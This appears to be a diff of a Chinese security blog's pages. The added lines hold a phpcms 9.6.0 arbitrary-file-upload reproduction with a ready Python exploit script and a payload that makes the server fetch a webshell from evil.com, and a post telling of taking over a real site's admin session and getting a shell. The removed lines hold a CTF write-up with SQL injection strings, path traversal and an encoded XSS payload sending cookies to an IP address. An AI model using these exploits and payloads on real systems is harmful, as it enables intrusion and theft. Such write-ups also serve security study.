+<p><code>phpcms/modules/member/index.php</code>:135</p>
+<pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {
+    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;
+    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;
+    $member_input = new member_input($userinfo[&#39;modelid&#39;]);        
+    $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);
+    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        
+}</code></pre>
+<p><code>$_POST[&#39;info&#39;]</code>被<code>new_html_special_chars</code>处理后,直接作为参数传入<code>$member_input-&gt;get</code></p>
+<p>跟进去发现</p>
+<pre><code class="php">if(is_array($data)) {
+            foreach($data as $field=&gt;$value) {
+                ...
+                $field = safe_replace($field);
+                ...
+                $func = $this-&gt;fields[$field][&#39;formtype&#39;];
+                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);
+
+                $info[$field] = $value;
+            }
+        }</code></pre>
+<p><code>$this-&gt;$func($field, $value);</code>令人浮想联翩的命令,而<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,其中<code>$field</code>是我们可控的输入<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p>
+<p>而<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>有以下取值,我们可以控制其执行某一函数</p>
+<pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;
+$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;
+$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;
+$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;
+$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;
+$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;
+$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
+$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;
+$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;
+$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
+$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;
+$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
+$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;
+$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;
+$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
+$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;
+$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;
+$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;
+$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;
+$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;
+$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;
+$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;
+$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre>
+<p>一个一个查看最后发现:</p>
+<pre><code class="php">    function editor($field, $value) {
+        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);
+        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];
+        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);
+        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);
+        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);
+        return $value;
+    }</code></pre>
+<p><code>editor</code>会调用download方法,其中<code>$field</code>和<code>$value</code>都是可控的</p>
+<p>跟进<code>download</code>:</p>
+<pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)
+    {
+        global $image_d;
+        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);
+        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
+        $this-&gt;field = $field;
+        $dir = date(&#39;Y/md/&#39;);
+        $uploadpath = $upload_url.$dir;
+        $uploaddir = $this-&gt;upload_root.$dir;
+        $string = new_stripslashes($value);
+        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
+        $remotefileurls = array();
+        foreach($matches[3] as $matche)
+        {
+            if(strpos($matche, &#39;://&#39;) === false) continue;
+            dir_create($uploaddir);
+            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);
+        }
+        unset($matches, $string);
+        $remotefileurls = array_unique($remotefileurls);
+        $oldpath = $newpath = array();
+        foreach($remotefileurls as $k=&gt;$file) {
+            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;
+            $filename = fileext($file);
+            $file_name = basename($file);
+            $filename = $this-&gt;getname($filename);
+
+            $newfile = $uploaddir.$filename;
+            $upload_func = $this-&gt;upload_func;
+            if($upload_func($file, $newfile)) {
+                $oldpath[] = $k;
+                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;
+                @chmod($newfile, 0777);
+                $fileext = fileext($filename);
+                if($watermark){
+                    watermark($newfile, $newfile,$this-&gt;siteid);
+                }
+                $filepath = $dir.$filename;
+                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);
+                $aid = $this-&gt;add($downloadedfile);
+                $this-&gt;downloadedfiles[$aid] = $filepath;
+            }
+        }
+        return str_replace($oldpath, $newpath, $value);
+    }    </code></pre>
+<p><code>download</code>用<code>$upload_func($file, $newfile)</code>来下载文件到服务器,而<code>$upload_func=&quot;copy&quot;</code></p>
+<p>我们分析一下<code>download</code>函数,<code>$file</code>和<code>$newfile</code>经过的处理</p>
+<p><code>$file</code>是<code>$remotefileurls</code>中的值</p>
+<pre><code class="php">        $string = new_stripslashes($value);//反转义
+        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
+        $remotefileurls = array();
+        foreach($matches[3] as $matche)
+        {
+            if(strpos($matche, &#39;://&#39;) === false) continue;
+            dir_create($uploaddir);
+            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);
+        }</code></pre>
+<p>跟进<code>$this-&gt;fillurl</code>,大概功能是,去掉url<code>#</code>后面的东西</p>
+<pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {
+        ...
+        $pos = strpos($surl,&#39;#&#39;);
+        if($pos&gt;0) $surl = substr($surl,0,$pos);
+        ...
+    }</code></pre>
+<p>构造<code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p>
+<p>我们再看下<code>$newfile</code></p>
+<pre><code class="php">$dir = date(&#39;Y/md/&#39;);
+$uploaddir = $this-&gt;upload_root.$dir;
+$filename = fileext($file);
+$filename = $this-&gt;getname($filename);
+$newfile = $uploaddir.$filename;</code></pre>
+<p><code>$this-&gt;getname</code>:</p>
+<pre><code class="php">function getname($fileext){
+        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;
+    }</code></pre>
+<p>webshell的地址为:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p>
+<p>最后payload为:</p>
+<pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
+post:
+info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre><code class="python">import re
+import requests
+import random
+
+def exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):
+    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
+    data = {
+        &#39;siteid&#39;: &#39;1&#39;,
+        &#39;modelid&#39;: &#39;1&#39;,
+        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),
+        &#39;password&#39;: &#39;testxx&#39;,
+        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),
+        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,
+        &#39;dosubmit&#39;: &#39;1&#39;,
+    }
+    rep = requests.post(u, data=data)
+    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()
+    print(rep.text)
+    print(result)
+
+
+exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/">http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="ck917a7cp002su8v0cd838tko" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-记一次漏洞挖掘" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="article-date">
+  <time class="dt-published" datetime="2020-02-11T05:54:56.708Z" itemprop="datePublished">2020-02-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">记一次漏洞挖掘</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="无标题"><a href="#无标题" class="headerlink" title="无标题"></a>无标题</h1><p>某个月黑风高的晚上,我突然想起了我的复古游戏机还差一点库币,于是决定去挖个洞 …….</p>
+<p>经过一番惨绝人寰,欲罢不能的信息收集后,我开始了fuzz,然后 ip被ban:(</p>
+<p>主要的信息为:</p>
+<pre><code>dedecms 5.7sp1 20150618
+ZOHO ManageEngine OpManager
+adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的后台也没爆出来,但是发现他们服务器配置错误,可以浏览目录</p>
+<p>把该版本的dedecms之后的更新对比了以下,没发现有啥洞,此时就陷入了僵局</p>
+<p>但是,我随手点了一个<code>en</code>的超链接,就发现了一个新的域名!!!!</p>
+<p>然后这个域名下的服务,也是dedecms,而后台就是<code>/dede</code></p>
+<p>利用前面发现的目录浏览,我成功拿到了<code>admin</code>的session,直接进入后台getshell</p>
+<p><strong>一些网站的英文站点可能就是我们的突破口</strong></p>
+<p>资产收集真的太重要了,要不是这次运气好,我还不知道啥时候能日掉</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/11/记一次漏洞挖掘/">http://blog.ccreater.top/2020/02/11/记一次漏洞挖掘/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="ck917a7do004du8v0c9g9571o" data-title="记一次漏洞挖掘" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-DedeCMS 5.7 plusguestbook.php注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -453,1673 +1567,11 @@ def poc(url):
 
 
   
-    <article id="post-2020hgame" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/07/2020hgame/" class="article-date">
-  <time class="dt-published" datetime="2020-02-07T12:20:03.284Z" itemprop="datePublished">2020-02-07</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/07/2020hgame/">2020hgame</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote>
-<p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p>
-</blockquote>
-<p>根据提示下载.git</p>
-<pre><code class="bash">$ git remote -v
-#查看git</code></pre>
-<p>查看提交历史拿到flag</p>
-<h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p>
-<pre><code>GET / HTTP/1.1
-Host: kyaru.hgame.n3ko.co
-Cache-Control: no-cache
-Upgrade-Insecure-Requests: 1
-User-Agent: Cosmos Brower
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-referer: https://vidar.club/ 
-x-forwarded-for: 127.0.0.1
-If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT
-Connection: close
-
-</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p>
-<p>修改GET为post</p>
-<h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p>
-<h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><pre><code class="php">&lt;?php
-include &quot;config.php&quot;;
-session_start();
-
-//Only for debug
-if (DEBUG_MODE){
-    if(isset($_GET[&#39;debug&#39;])) {
-        $debug = $_GET[&#39;debug&#39;];
-        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
-            die(&quot;args error!&quot;);
-        }
-        eval(&quot;var_dump($$debug);&quot;);
-    }
-}
-
-if(isset($_SESSION[&#39;username&#39;])) {
-    header(&quot;Location: admin.php&quot;);
-    exit();
-}
-else {
-    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
-        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){
-            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];
-            header(&quot;Location: admin.php&quot;);
-            exit();
-        }
-        else {
-            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;
-        }
-    }
-}
-?&gt;
-</code></pre>
-<p>adminpassword: 0e114902927253523756713132279690 </p>
-<p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p>
-<p>adminusername: Cosmos! </p>
-<p>index.php</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-session_start();
-
-if(isset($_SESSION[&#39;username&#39;])) {
-    header(&quot;Location: admin.php&quot;);
-    exit();
-}
-
-$action = @$_GET[&#39;action&#39;];
-$filter = &quot;/config|etc|flag/i&quot;;
-
-if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {
-    if(preg_match($filter, $_GET[&#39;action&#39;])) {
-        echo &quot;Hacker get out!&quot;;
-        exit();
-    }
-        include $action;
-}
-elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {
-    header(&quot;Location: ?action=login.php&quot;);
-    exit();
-}</code></pre>
-<p>admin.php</p>
-<pre><code class="php">&lt;?php
-include &quot;config.php&quot;;
-session_start();
-if(!isset($_SESSION[&#39;username&#39;])) {
-    header(&#39;Location: index.php&#39;);
-    exit();
-}
-
-function insert_img() {
-    if (isset($_POST[&#39;img_url&#39;])) {
-        $img_url = @$_POST[&#39;img_url&#39;];
-        $url_array = parse_url($img_url);
-        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {
-            return false;
-        }   
-        $c = curl_init();
-        curl_setopt($c, CURLOPT_URL, $img_url);
-        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
-        $res = curl_exec($c);
-        curl_close($c);
-        $avatar = base64_encode($res);
-
-        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
-            return $avatar;
-        }
-    }
-    else {
-        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
-    }
-}
-?&gt;
-
-&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;
-</code></pre>
-<p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p>
-<p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p>
-<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p>
-<p>过滤:select</p>
-<p>黑名单:空格</p>
-<pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#
-information_schema,easysql
-0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
-f1aggggggggggggg,messages#
-GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;
-fl4444444g
-
-hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p>
-<pre><code class="php">&lt;?php
-
-// function encrypt($str){
-//     $result = &#39;&#39;;
-//     for($i = 0; $i &lt; strlen($str); $i++){
-//         $result .= chr(ord($str[$i]) + 1);
-//     }
-//     return $result;
-// }
-function encrypt($str)
-{
-    $result = &#39;&#39;;
-    for($i = 0; $i &lt; strlen($str); $i++){
-        $result .= chr(ord($str[$i]) - 1);
-    }
-    return $result;
-}
-$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;
-$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);
-preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
-$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);
-
-while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;)
-{
-    $arr=array();
-    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
-    $newcmd=$arr[0].$newcmd.&quot;)&quot;;    
-    $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);
-
-}
-
-$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    
-
-
-$dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);
-?&gt;</code></pre>
-<p>python </p>
-<pre><code class="python">import requests
-def get_flag():
-    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]
-    enccmd=enccmd[:len(enccmd)-75]
-    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]
-    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]
-    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}
-    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text
-    data={&quot;token&quot;:dec}
-    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])
-
-get_flag()</code></pre>
-<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre>
-<p>输入会变成大写</p>
-<h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p>
-<p>而默认的逻辑是没法实现的</p>
-<pre><code class="php">        if($this-&gt;rank &lt;= 2){
-                $this-&gt;rank = 2;
-            }</code></pre>
-<p>阅读代码发现反序列化点:</p>
-<p><code>Monster</code>的<code>__construct</code>方法</p>
-<pre><code class="php">public function __construct($key){
-        $this-&gt;encryptKey = $key;
-        if(!isset($_COOKIE[&#39;monster&#39;])){
-            $this-&gt;Set();
-            return;
-        }
-
-        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);
-        if(strlen($monsterData) &gt; 32){
-            $sign = substr($monsterData, -32);
-            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);
-            if(md5($monsterData . $this-&gt;encryptKey) === $sign){
-                $this-&gt;monsterData = unserialize($monsterData);
-            }else{
-                session_start();
-                session_destroy();
-                setcookie(&#39;monster&#39;, &#39;&#39;);
-                header(&#39;Location: index.php&#39;);
-                exit;
-            }
-        }
-
-        $this-&gt;Set();     
-    }</code></pre>
-<p>但是要知道<code>$key</code>才能反序列化</p>
-<p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p>
-<pre><code class="php">
-class Game
-{   
-    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
-    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;
-
-    private $sign = &#39;&#39;;
-    public $rank;
-//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
-    public function __construct($playerName){
-        $_SESSION[&#39;player&#39;] = $playerName;
-        if(!isset($_SESSION[&#39;exp&#39;])){
-            $_SESSION[&#39;exp&#39;] = 0;
-        }
-        $data = [$playerName, $this-&gt;encryptKey];
-        $this-&gt;init($data);//set sign
-        $this-&gt;monster = new Monster($this-&gt;sign);
-        $this-&gt;rank = new Rank();
-    }
-
-    private function init($data){
-        foreach($data as $key =&gt; $value){
-            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
-            $this-&gt;sign .= md5($this-&gt;sign . $value);
-        }
-    }
-}</code></pre>
-<p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p>
-<pre><code class="php">public function __destruct(){
-        // 确保程序是跑在服务器上的！
-        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];
-        if($this-&gt;key === $this-&gt;serverKey){
-            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;
-        }else{
-            // 非正常访问
-            session_start();
-            session_destroy();
-            setcookie(&#39;monster&#39;, &#39;&#39;);
-            header(&#39;Location: index.php&#39;);
-            exit;
-        }
-    }</code></pre>
-<p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p>
-<p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p>
-<p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p>
-<p>如:</p>
-<pre><code class="php">&lt;?php
-class test{
-    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;
-    public function __destruct()
-    {
-        echo $this-&gt;my_static;
-    }
-
-}
-class tesa{
-
-}
-$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));
-unserialize($a);
-
-
-结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
-<p>于是构造</p>
-<pre><code class="php">&lt;?php
-class Game
-{
-    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
-    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;
-
-    public $sign = &#39;&#39;;
-    public $rank;
-//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
-    public function __construct($playerName){
-        $_SESSION[&#39;player&#39;] = $playerName;
-        if(!isset($_SESSION[&#39;exp&#39;])){
-            $_SESSION[&#39;exp&#39;] = 0;
-        }
-        $data = [$playerName, $this-&gt;encryptKey];
-        $this-&gt;init($data);//set sign
-    }
-
-    private function init($data){
-        foreach($data as $key =&gt; $value){
-            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
-            $this-&gt;sign .= md5($this-&gt;sign . $value);
-        }
-    }
-}
-class Rank
-{
-    private $rank;
-//    private $serverKey;     // 服务器的 Key
-//    private $key;
-
-    public function __construct()
-    {
-        $this-&gt;rank=1;
-    }
-
-    public function __destruct(){
-
-    }
-}
-$s=new Rank();
-//$s=array(&#39;name&#39;=&gt;&#39;蔡建斌&#39;,&#39;no&#39;=&gt;999999999999999999);
-$a=new Game($_GET[&#39;name&#39;]);
-$sign = md5(serialize($s) . $a-&gt;sign);
-print( base64_encode(serialize($s) . $sign));
-?&gt;
-</code></pre>
-<h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p>
-<p>前一段时间爆出来的mt_srand逆向刚好可以用到</p>
-<p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p>
-<pre><code class="php">import requests
-import os
-
-burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;
-burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
-burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
-result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text
-
-a=eval(result)
-p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )
-x=p.read().strip()
-
-burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;
-burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
